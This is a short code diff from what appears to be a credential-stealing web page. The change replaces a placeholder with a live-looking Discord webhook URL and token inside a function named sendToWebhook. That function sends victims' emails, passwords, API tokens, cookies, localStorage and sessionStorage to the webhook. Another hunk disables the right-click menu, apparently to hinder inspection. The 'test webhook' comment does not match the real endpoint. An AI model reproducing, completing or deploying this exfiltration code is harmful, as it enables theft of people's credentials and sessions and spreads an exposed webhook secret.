@@ -215,7 +215,7 @@
 - // --------------------------------------------------
 - async function sendToWebhook(email, password, tokenData) {
 -   // Use a test webhook URL (e.g., from https://webhook.site)
--   const webhookUrl = "https://your-test-webhook-url-here"; // Replace with test webhook
+-   const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with test webhook
 -   const { apiToken, userTokens } = tokenData || { apiToken: null, userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} } };
 -   const payload = {
 -     content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
@@ -305,3 +305,4 @@
 - document.addEventListener("contextmenu", function (e) {
 -   e.preventDefault();
 - });
+
